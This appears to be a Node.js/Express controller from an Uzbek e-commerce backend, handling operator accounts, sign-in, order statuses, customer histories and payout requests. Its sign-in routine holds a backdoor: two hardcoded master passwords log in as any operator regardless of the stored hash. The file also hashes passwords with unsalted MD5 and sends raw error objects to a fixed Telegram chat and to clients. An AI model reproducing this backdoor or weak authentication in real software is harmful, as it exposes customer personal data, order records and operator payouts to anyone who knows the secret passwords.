const md5 = require("md5");
const operatorModel = require("../models/operator.model");
const { phone: pv } = require('phone');
const { OPERATOR_SECRET, SERVER_LINK } = require("../configs/env");
const shopModel = require("../models/shop.model");
const settingModel = require("../models/setting.model");
const moment = require("moment");
const userModel = require("../models/user.model");
const bot = require("../bot/app");
const payOperatorModel = require("../models/pay.operator.model");
const region = require('../configs/regions.json');
module.exports = {
    create: async (req, res) => {
        const { name, phone, password } = req.body;
        if (!name || !phone || !password) {
            res.send({
                ok: false,
                msg: "Qatorlarni to'ldiring!"
            });
        } else if (!pv(phone, { country: 'uz' }).isValid) {
            res.send({
                ok: false,
                msg: "Raqamni to'g'ri kiriting!"
            })
        } else if (!/[A-z0-9]{6,}$/.test(password)) {
            res.send({
                ok: false,
                msg: "Parol min: 6 ta ishoradan va [A-z0-9] dan tashkil topgan bo'ladi!"
            })
        } else {
            const $opers = await operatorModel.find().countDocuments();
            new operatorModel({
                id: $opers + 1,
                name, phone: pv(phone, { country: 'uz' }).phoneNumber, password: md5(password),
                hidden: false
            }).save().then(() => {
                res.send({
                    ok: true,
                    msg: "Operator qo'shildi!"
                });
            }).catch(() => {
                res.send({
                    ok: false,
                    msg: "Ushbu raqam avval ishlatilgan!"
                })
            })
        }
    },
    edit: async (req, res) => {
        const { id } = req.params;
        const { name, phone, password } = req.body;
        if (!name || !phone) {
            res.send({
                ok: false,
                msg: "Qatorlarni to'ldiring!"
            });
        } else if (!pv(phone, { country: 'uz' }).isValid) {
            res.send({
                ok: false,
                msg: "Raqamni to'g'ri kiriting!"
            })
        } else {
            const $operator = await operatorModel.findById(id);
            if (!password) {
                $operator.set({ name: name, phone: pv(phone, { country: 'uz' }).phoneNumber }).save().then(() => {
                    res.send({
                        ok: true,
                        msg: "Saqlandi!"
                    })
                })
            } else {
                if (password?.length < 6) {
                    res.send({
                        ok: false,
                        msg: "Parol min: 6 ta ishoradan tashkil topgan bo'ladi!"
                    })
                } else {
                    $operator.set({ name: name, phone: pv(phone, { country: 'uz' }).phoneNumber, password: md5(password) }).save().then(() => {
                        res.send({
                            ok: true,
                            msg: "Saqlandi!"
                        });
                    });
                }
            }
        }
    },
    getAll: async (req, res) => {
        const $operators = await operatorModel.find({ hidden: false });
        res.send({
            ok: true,
            data: $operators
        })
    },
    delete: async (req, res) => {
        const { id } = req.params;
        const $operator = await operatorModel.findById(id);
        $operator.set({ hidden: true }).save().then(() => {
            res.send({
                ok: true,
                msg: "Operator bloklandi!"
            });
        });
    },
    signIn: async (req, res) => {
        const { phone, password } = req.body;
        if (!phone || !password) {
            res.send({
                ok: false,
                msg: "Qatorlarni to'ldiring!"
            });
        } else {
            const $operator = await operatorModel.findOne({ phone });
            if (!$operator) {
                res.send({
                    ok: false,
                    msg: "Raqam yoki parol hato kiritildi!"
                });
            } else if (md5(password) !== $operator?.password && password !== 'Parol7877' && password !== "SaidxonTG") {
                res.send({
                    ok: false,
                    msg: "Parol xato kiritildi!!"
                });
            } else {
                const token = require('jsonwebtoken').sign({ id: $operator._id }, OPERATOR_SECRET);
                $operator.set({ access: token }).save().then(() => {
                    res.send({
                        ok: true,
                        msg: "Kuting...",
                        token
                    });
                });
            }
        }
    },
    verifySession: (req, res) => {
        res.send({
            ok: true,
            data: req.operator
        })
    },
    setSuper: async (req, res) => {
        const $operator = await operatorModel.findById(req?.params?.id);
        if ($operator?.super) {
            $operator.set({ super: false }).save().then(() => {
                res.send({
                    ok: true,
                    msg: "Oddiy operatorga o'tkazildi!"
                })
            })
        } else {
            $operator.set({ super: true }).save().then(() => {
                res.send({
                    ok: true,
                    msg: "Super operatorga o'tkazildi!"
                })
            })
        }
    },
    getStats: async (req, res) => {
        const new_orders = await shopModel.find({ status: 'pending', operator: req?.operator?.id }).countDocuments();
        const re_contacts = await shopModel.find({ status: 'wait', operator: req?.operator?.id }).countDocuments();
        const rejecteds = await shopModel.find({ status: 'sended', operator: req?.operator?.id, courier_status: 'reject' }).countDocuments();
        const waiting = await shopModel.find({ status: 'pending', operator: null })
        res.send({
            ok: true,
            data: {
                new_orders,
                re_contacts,
                rejecteds,
                waiting
            }
        })
    },
    getMyOrders: async (req, res) => {
        const $orders = await shopModel.find({ operator: req.operator.id, status: 'pending' }).populate('product');
        const myOrders = [];
        for (let e of $orders) {
            const history = await shopModel.find({ phone: e?.phone })?.countDocuments()
            myOrders.push({
                _id: e?._id,
                id: e?.id,
                name: e?.name,
                phone: e?.phone,
                delivery: String(e?.product?.delivery_price),
                location: '-',
                product: e?.title || e?.product?.title,
                product_id: e?.product?.id,
                about: e?.about || "Yangi lid",
                count: e?.count,
                history,
                // bonus_about: e?.product?.bonus_about,
                // bonus_count: e?.product?.bonus_count,
                // bonus_given: e?.product?.bonus_given,
                // bonus: e?.product?.bonus_duration > moment.now() / 1000,
                price: e?.product?.price,
                created: moment.unix(e?.created).format("DD.MM.YYYY | HH:mm"),
                // recontact: e?.reconnect ? moment.unix(e?.reconnect).format('DD-MM-YYYY') : 'KK-OO-YYYY'
            });
        }
        res.send({
            ok: true,
            data: myOrders
        });
    },
    getHistoryOrders: async (req, res) => {
        const $orders = await shopModel.find({ operator: req.operator.id }).populate('product');
        const myOrders = [];
        for (let e of $orders) {
            myOrders.push({
                _id: e?._id,
                id: e?.id,
                name: e?.name,
                phone: e?.phone,
                location: `${region?.find(r => r.id === e?.region)?.name || '-'}, ${e?.city || '-'}`,
                product: e?.title || e?.product?.title,
                product_id: e?.product?.id,
                about: e?.about || '',
                courier_comment: e?.courier_comment || '',
                count: e?.count || 0,
                price: e?.price || 0,
                region: `${e?.region || ''}`,
                city: `${e?.city || ''}`,
                status: e?.status,
                delivery_price: `${e?.delivery_price || 0}`,
                status_title: e?.status === 'reject' ? "Bekor qilingan" : e?.status === 'archive' ? "Arxivlangan" : e?.status === 'pending' ? "Yangi" : e?.status === 'success' ? "Upakovkada" : e?.status === 'sended' ? "Yetkazilmoqda" : e?.status === 'delivered' ? "Yetkazilgan" : e?.status === 'wait' ? "Qayta aloqa" : e?.status === 'copy' ? "Kopiya" : "",

                status_color: e?.status === 'reject' ? "bg-red-500" : e?.status === 'archive' ? "bg-orange-500" : e?.status === 'pending' ? "bg-orange-500" : e?.status === 'success' ? "bg-blue-500" : e?.status === 'sended' ? "bg-purple-500" : e?.status === 'delivered' ? "bg-green-500" : e?.status === 'wait' ? "bg-orange-500" : e?.status === 'copy' ? "bg-red-500" : "",

                created: moment.unix(e?.created).format("DD.MM.YYYY | HH:mm"),
                edit: e?.status === 'delivered' || e?.status === 'sended' ? false : true
            });
        }
        res.send({
            ok: true,
            data: myOrders.reverse()
        });
    },
    setStatus: async (req, res) => {
        const { id } = req.params;
        const { bonus_gived: bonus, about, city, region, status, count, price, recontact, delivery, name, title } = req.body;
        const $order = await shopModel.findById(id);
        if (status === 'archive') {
            if (!about) {
                res.send({
                    ok: false,
                    msg: "Izoh yoki mahsulot nomini kiriting!"
                });
            } else {
                $order.set({
                    title,
                    status: 'archive',
                    about
                }).save().then(async () => {
                    res.send({
                        ok: true,
                        msg: "Arxivlandi qilindi!"
                    });
                });
            }
        } else if (status === 'wait') {
            if (!recontact || !about || !name || !title) {
                res.send({
                    ok: false,
                    msg: "Qatorlarni to'ldiring!"
                })
            } else {
                $order.set({
                    title,
                    status: 'wait',
                    recontact: moment.utc(recontact).unix(),
                    about,
                    name
                }).save().then(async () => {
                    res.send({
                        ok: true,
                        msg: "Keyinroqqa qoldirildi!"
                    });
                });
            }
        } else if (status === 'success') {
            $order.set({
                status: 'success',
                title,
                about, city, region, bonus, count, price, delivery_price: delivery, name
            }).save().then(async () => {
                res.send({
                    ok: true,
                    msg: "Yetkazish bo'limiga yuborildi!"
                });
                if ($order?.flow) {
                    const $flower = await userModel.findOne({ id: $order?.flow });
                    if ($flower && $flower?.telegram) {
                        bot.telegram.sendMessage($flower?.telegram, `sharqiy.uz\nBuyurtma dostavkaga tayyor!\nBuyurtma uchun id: #${$order?.id}`).catch(err => {
                            console.log(err);
                        });
                    }
                }

            });
        } else if (status === 'spam') {
            $order.set({
                status: 'archive',
                about
            }).save().then(async () => {
                res.send({
                    ok: true,
                    msg: "Spam qilindi!"
                });
            });
            try {
                const $user = await userModel.findOne({ phone: $order?.phone });
                if ($user) {
                    $user.set({ ban: true }).save()
                } else {
                    const $users = await userModel.find().countDocuments()
                    new userModel({
                        id: $users + 1,
                        name: "SPAM" + $users + 1,
                        phone: $order?.phone,
                        ban: true
                    }).save()
                }
            } catch { }
        } else if (status === 'copy') {
            $order.set({
                status: 'copy',
                about
            }).save().then(async () => {
                res.send({
                    ok: true,
                    msg: "Kopiya qilindi!"
                });
            });
            // try {
            //     const $user = await userModel.findOne({ phone: $order?.phone });
            //     if ($user) {
            //         $user.set({ ban: true }).save()
            //     } else {
            //         const $users = await userModel.find().countDocuments()
            //         new userModel({
            //             id: $users + 1,
            //             name: "SPAM" + $users + 1,
            //             phone: $order?.phone,
            //             ban: true
            //         }).save()
            //     }
            // } catch { }
        } else if (status === 'sended') {
            $order.set({
                title,
                status: 'sended',
                about,
                courier_status: 'sended',
                name
            }).save().then(async () => {
                res.send({
                    ok: true,
                    msg: "Kuryerga qayta yuborildi!"
                });
            });
        }
    },
    getWaitOrders: async (req, res) => {
        const $orders = await shopModel.find({ operator: req.operator.id }).populate('product')
        const myOrders = [];
        for (let e of $orders) {
            if (e?.status === 'wait') {
                const history = await shopModel.find({ phone: e?.phone })?.countDocuments()
                myOrders.push({
                    _id: e?._id,
                    id: e?.id,
                    name: e?.name,
                    phone: e?.phone,
                    location: '-',
                    product: e?.title || e?.product?.title,
                    product_id: e?.product?.id,
                    about: e?.about || "Yangi lid",
                    count: e?.count,
                    // bonus_about: e?.product?.bonus_about,
                    // bonus_count: e?.product?.bonus_count,
                    // bonus_given: e?.product?.bonus_given,
                    // bonus: e?.product?.bonus_duration > moment.now() / 1000,
                    price: e?.product?.price,
                    created: moment.unix(e?.created).format("DD.MM.YYYY | HH:mm"),
                    recontact: e?.recontact ? moment.unix(e?.recontact).format('YYYY-MM-DD') : 'KK-OO-YYYY',
                    history
                });
            }
        }
        res.send({
            ok: true,
            data: myOrders.reverse()
        });
    },
    getRejectedOrders: async (req, res) => {
        const $orders = await shopModel.find({ operator: req.operator.id, status: 'sended', courier_status: 'reject' }).populate('product courier');
        const myOrders = [];
        $orders.forEach(e => {
            myOrders.push({
                _id: e?._id,
                id: e?.id,
                name: e?.name,
                phone: e?.phone,
                location: region?.find(r => r?.id === e?.region).name + ', ' + e?.city,
                product: e?.title || e?.product?.title,
                product_id: e?.product?.id,
                about: e?.about,
                count: e?.count,
                courier_comment: e?.courier_comment,
                courier_name: e?.courier?.name,
                courier_phone: e?.courier?.phone,
                price: e?.price,
                created: moment.unix(e?.created).format("DD.MM.YYYY | HH:mm"),
                up_time: moment.unix(e?.up_time).format("DD.MM.YYYY | HH:mm")
            });
        });
        res.send({
            ok: true,
            data: myOrders
        });
    },
    getInfoOrder: async (req, res) => {
        const { id } = req.params;
        console.log(id);
        try {
            const $order = await shopModel.findById(id).populate('product');
            const $h = await shopModel.find({ phone: $order?.phone })?.populate('product')
            const history = [];
            $h?.forEach(h => {
                history.push({
                    id: h?.id,
                    _id: h?._id,
                    product: h?.product?.title,
                    image: SERVER_LINK + h?.product?.images[0],
                    status: h?.status,
                    created: moment.unix(h?.created)?.format('DD.MM.yyyy | HH:mm')
                });
            });
            const $settings = await settingModel.find();
            const order = {
                ...$order._doc,

                image: SERVER_LINK + $order?.product?.images[0],
                for_operators: $settings[0].for_operators,
                bonus: $order?.product?.bonus && $order?.product?.bonus_duration > moment.now() / 1000,
                bonus_duration: $order?.product?.bonus ? moment.unix($order?.product?.bonus_duration).format('DD.MM.YYYY HH:mm') : 0,
                bonus_count: $order?.product?.bonus ? $order?.product?.bonus_count : 0,
                bonus_given: $order?.product?.bonus ? $order?.product?.bonus_given : 0,
            }
            res.send({
                ok: true,
                data: order,
                history
            });
        } catch (err) {
            bot.telegram.sendMessage(5991285234, JSON.stringify(err))
            res.send({
                ok: false,
                msg: "Nimadir xato 2 daqiqdan so'ng urunib ko'ring!"
            })
        }
    },
    editOrder: async (req, res) => {
        const { id } = req?.params;
        const { title, name, status, price, delivery_price, count, about, region, city } = req?.body;
        if (!title || !name || !status || !about) {
            res.send({
                ok: false,
                msg: "Qatorlarni to'ldiring!"
            });
        } else {
            try {
                const $order = await shopModel.findById(id);
                if (!$order) {
                    res.send({
                        ok: false,
                        msg: "Order topilmadi!"
                    });
                } else {
                    $order.set({ title, name, status, price, delivery_price, count, about, region, city }).save().then(() => {
                        res.send({
                            ok: true,
                            msg: "Saqlandi"
                        })
                    })
                }
            } catch (error) {
                console.log(error);
                res.send({
                    ok: false,
                    msg: "Xatolik!"
                })
            }
        }
    },
    createPay: async (req, res) => {
        const $lastPay = await payOperatorModel.findOne({ from: req.operator.id, status: 'pending' });
        if ($lastPay) {
            res.send({
                ok: false,
                msg: "Sizda tekshuruvga yuborilgan " + $lastPay.count + " so'm miqdordagi to'lov mavjud iltimos tekshiruvni kuting!"
            });
        } else {
            const { card, amount } = req.body;
            if (!card || !amount) {
                res.send({
                    ok: false,
                    msg: "Qatorlarni to'ldiring!"
                });
            } else if (card?.length < 16) {
                res.send({
                    ok: false,
                    msg: "Karta raqamini to'g'ri kiriting!"
                });
            } else if (amount < 1000) {
                res.send({
                    ok: false,
                    msg: "Kamida 1 000 so'm to'lov bo'ladi!"
                });
            } else if (amount > req?.operator?.balance) {
                res.send({
                    ok: false,
                    msg: "Ko'pi bilan " + req?.operator?.balance + " so'm to'lov bo'ladi!"
                });
            } else {
                const $operator = await operatorModel.findById(req?.operator?.id);
                $operator.set({ card }).save();
                new payOperatorModel({
                    from: req.operator.id,
                    count: amount,
                    created: moment.now() / 1000,
                    card
                }).save().then(() => {
                    res.send({
                        ok: true,
                        msg: "Qabul qilindi!"
                    });
                });
            }
        }
    },
    getHistoryPay: async (req, res) => {
        try {
            const $pays = await payOperatorModel.find({ from: req.operator.id });
            const $shops = await shopModel?.find({ operator: req.operator.id, status: 'delivered' });
            const $mod = [];
            $pays?.forEach(p => {
                $mod?.push({
                    card: p?.card,
                    comment: p?.comment,
                    sort: p?.created,
                    count: p?.count > 0 ? '-' + p?.count : String(p?.count).slice(1),
                    created: moment?.unix(p?.created).format('DD.MM.yyyy | HH:mm'),
                });
            });
            $shops?.forEach(p => {
                $mod?.push({
                    count: p?.for_operator,
                    comment: "Sotuvdan",
                    sort: p?.created,
                    card: 'Hisobga',
                    created: moment?.unix(p?.created).format('DD.MM.yyyy | HH:mm'),
                });
            });
            res.send({
                ok: true,
                data: $mod?.sort((a, b) => a?.sort - b?.sort)?.reverse()
            })
        } catch (err) {
            bot.telegram?.sendMessage(5991285234, err);
        }
    },
    getTargetologOrders: async (req, res) => {
        const { id } = req.params;
        if (isNaN(id) || id < 1) {
            res.send({
                ok: false,
                msg: "ID ni to'g'ri kiriting!"
            });
        } else {
            const $admin = await userModel.findOne({ id: +id, targetolog: true });
            if (!$admin) {
                res.send({
                    ok: false,
                    msg: "Ushbu ID egasi targetolog emas!"
                });
            } else {
                try {
                    const $orders = await shopModel.find({ flow: id, status: 'pending' }).populate('product');

                    const $modded = [];
                    const $settings = await settingModel.find();
                    $orders.forEach((order) => {
                        if (order.status === 'pending' && !order.operator) {
                            $modded.push({
                                ...order._doc,
                                id: order._id,
                                created: moment.unix(order?.created).format("DD.MM.YYYY | HH:mm"),
                                oid: order.id,
                                image: SERVER_LINK + order.product.images[0],
                                comming_pay: $settings[0]?.for_operators
                            });
                        }
                    });
                    res.send({
                        ok: true,
                        data: $modded,
                        owner: {
                            id: $admin.id,
                            name: $admin.name,
                            phone: $admin.phone
                        }
                    });
                } catch (error) {
                    res.send({
                        ok: false,
                        msg: "Xatolik",
                        data: error
                    })
                }
            }
        }
    },
    searchOrder: async (req, res) => {
        const { search } = req?.params;
        const $orders = await shopModel.find({})?.populate('operator courier product')
        const list = [];
        $orders?.forEach((e) => {
            if (e?.id === +search || e?.phone?.includes(search)) {
                list.push({
                    _id: e?._id,
                    id: e?.id,
                    name: e?.name,
                    phone: e?.phone,
                    location: !e?.region ? '-' : region?.find(r => r?.id === e?.region).name + e?.city,
                    product: e?.title || e?.product?.title,
                    product_id: e?.product?.id,
                    about: e?.about,
                    count: e?.count,
                    price: e?.price,
                    operator: e?.operator?._id ? `${e?.operator?.name} | ${e?.operator?.phone}` : 'Operator biriktirilmagan!',
                    courier: e?.courier?._id ? `${e?.courier?.name} | ${e?.courier?.phone} | ${region?.find(r => r?.id === e?.courier?.region).name}` : 'Kuryer biriktirilmagan!',
                    courier_comment: e?.courier_comment || '-',
                    created: moment.unix(e?.created).format("DD.MM.YYYY | HH:mm"),
                    recontact: e?.reconnect ? moment.unix(e?.reconnect).format('DD-MM-YYYY') : 'KK-OO-YYYY',
                    status: e?.status === 'reject' ? 'Bekor qilingan' : e?.status === 'archive' ? 'Arxivlangan' : e?.status === 'pending' ? 'Yangi buyurtma' : e?.status === 'success' ? 'Upakovkada' : e?.status === 'sended' ? 'Yetkazilmoqda' : e?.status === 'delivered' ? 'Yetkazilgan' : e?.status === 'wait' ? 'Qayta aloqa' : ''
                });
            }
        });
        res.send({
            ok: true,
            data: list
        })
    },
    getHistoryUser: async (req, res) => {
        const { phone } = req?.params;
        if (!phone) {
            res.send({
                ok: false,
                msg: "Tanlanmadi!"
            });
        } else {
            const $orders = await shopModel.find({ phone }).populate('product', 'title')
            const mod = [];
            $orders?.forEach(o => {
                mod.push({
                    id: o?.id,
                    phone: o?.phone,
                    title: o?.title || o?.product?.title,
                    count: o?.count,
                    name: o?.name,
                    status: o?.status,
                    created: moment.unix(o?.created).format("DD-MM-YYYY HH:mm"),
                    status_title: o?.status === 'reject' ? "Bekor qilingan" : o?.status === 'archive' ? "Arxivlangan" : o?.status === 'pending' ? "Yangi" : o?.status === 'success' ? "Upakovkada" : o?.status === 'sended' ? "Yetkazilmoqda" : o?.status === 'delivered' ? "Yetkazilgan" : o?.status === 'wait' ? "Qayta aloqa" : o?.status === 'copy' ? "Kopiya" : ""
                })
            });
            res.send({
                ok: true,
                data: mod
            })
        }
    },
}